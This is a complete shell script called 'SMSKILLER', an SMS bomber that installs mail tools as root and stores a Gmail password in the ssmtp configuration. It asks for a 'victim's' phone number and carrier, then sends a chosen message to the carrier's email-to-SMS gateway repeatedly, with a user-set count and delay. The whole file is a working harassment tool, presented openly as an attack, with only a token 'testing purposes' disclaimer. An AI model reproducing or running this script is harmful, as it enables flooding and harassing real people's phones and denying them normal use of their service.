#!/bin/sh
#########################################################
#########################################################
#	SMSKILLER{BOMBER} H4CKN3T VERSION		#
#	THIS IS FREE SOFTWARE TO USE AND DISTRIBUTE	#
	INSPIRED BY 2600 WINTER ISSUE			#
#	WWW.H4CKN3T.COM					#
#	11-12-2010					#
#########################################################
#########################################################
# COLORS FOR FUN
red='\e[0;31m'
RED='\e[1;31m'
blue='\e[0;34m'
BLUE='\e[1;34m'
cyan='\e[0;36m'
CYAN='\e[1;36m'
NC='\e[0m' # No CoLOR


clear
test "$(whoami)" != 'root' && (echo YOU MUST BE ROOT TO RUN THIS SCRIPT; exit 1)
IP=`ifconfig  | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}'`
if [ -z $IP ]; then
	clear;echo;echo;echo "	YOU MUST BE CONNECTED TO THE INTERNET TO RUN SCRIPT"
	exit 1
fi
echo -e " ${CYAN} #######################################################"
echo " #######################################################"
echo "	SMSKILLER 					"
echo "	THE H4CKN3T VERSION - 				 "
echo "	THIS IS FREE SOFTWARE TO USE AND DISTRIBUTE	"
echo "	WWW.H4CKN3T.COM					"
echo "	11-12-2010					"
echo " #######################################################"
echo " #######################################################"
sleep 3;echo;
echo
echo -e  " ${RED} BY CONTINUING USING THIS SOFTWARE YOU AGREE THAT THIS WAS MADE"
echo "	FOR TESTING PURPOSES ONLY, AND YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS"
sleep 5;clear
echo;echo;echo;
echo -e " ${CYAN} THIS SCRIPT WILL INSTALL MAILUTILS AND SSMTP. (apt-get install mailutils, apt-get install ssmtp)"; sleep 3
##starting script
echo " ${CYAN} ... CHECKING FOR DEPENDINCIES (MAILUTILS) ..." &
echo;echo

apt-get install mailutils -y
clear;echo;
echo "	NOW INSTALLING SSMTP"
echo;echo;

apt-get install ssmtp -y 
if [ "$?" != 0 ];then
		echo "	SOMETHING WENT WRONG.  CAN'T DOWNLOAD NEEDED FILES"
	exit 1
fi

clear;echo;echo;

echo -n "	ENTER GMAIL ADDRESS TO USE (ex. myemail@gmail.com): "
read AuthUser
echo;echo;
echo -n "	ENTER GMAIL ADDRESS PASSWORD (passwd WILL echo to screen): "
read AuthPass
clear;echo;echo;echo "	NOW SETTING UP CONFIG FILE WITH DATA"

echo "AuthUser=$AuthUser" >> /etc/ssmtp/ssmtp.conf
echo "AuthPass=$AuthPass" >> /etc/ssmtp/ssmtp.conf
echo "FromLineOverride=YES" >> /etc/ssmtp/ssmtp.conf
echo "mailhub=smtp.gmail.com:587" >> /etc/ssmtp/ssmtp.conf
echo "useSTARTTLS=YES" >> /etc/ssmtp/ssmtp.conf

echo "	INITIAL SETUP IS COMPLETE .. NOW STARTING ATTACK "
sleep 3
echo -n "ENTER VICTIM'S MOBILE  NUMBER: "
read NUM

echo;echo;

PS3="Choose (1-5):"
echo ""
echo "CHOOSE A CARRIER BELOW"
echo "<><><><><>"
select CARRIER in ATT BOOST VERIZON VIRGIN ALLTEL
do
break
done

ATT=@txt.att.net
BOOST=@myboostmobile.com
VERIZON=@vtext.com
VIRGIN=@vmobl.com
ALLTELL=@message.alltel.com

	NUMBER=${NUM}@txt.att.net

case $CARRIER in
		ATT)
		NUMBER=${NUM}@txt.att.net
	;;
		BOOST)
                NUMBER=${NUM}@myboostmobile.com
	;;
	        VERIZON)
		NUMBER=${NUM}@vtext.com
	;;
        	VIRGIN)
		NUMBER=${NUM}@vmobl.com	
	;;
		ALLTELL)
		NUMBER=${NUM}@message.alltel.com
	;;

   *)	
    ;;
esac
echo;echo;
echo -n "	ENTER SUBJECT: "
read SUBJECT
echo;echo;
echo "	USING $CARRIER ";sleep 1;echo;echo
echo -n "ENTER A SHORT MESSAGE: "
read MESSAGE

echo;echo;

echo -n "ATTACKING $NUMBER ";echo;
echo -n "CONTINUE ... (Y/N): )"
read NEXT

if [ $NEXT = n ];then 
	echo "RESTARTING";echo;echo;
	./smskiller.sh
elif [ "$NEXT" = y ];then
	echo $MESSAGE > 1.txt
	echo "HOW MANY MESSAGE DO YOU WANNA SEND: "
	read SMS
echo;echo
	echo "NUMBER OF SECONDS BETWEEN MESSAGES: "
	read SPEED
	COUNTER=0
until [ $SMS -le $COUNTER ];do
	cat 1.txt | mail -s "$SUBJECT" $NUMBER
	sleep $SPEED
	COUNTER=$(( $COUNTER + 1 ))
	echo "CTRL + C TO CALL OFF ATTACK ... "
    done
fi 





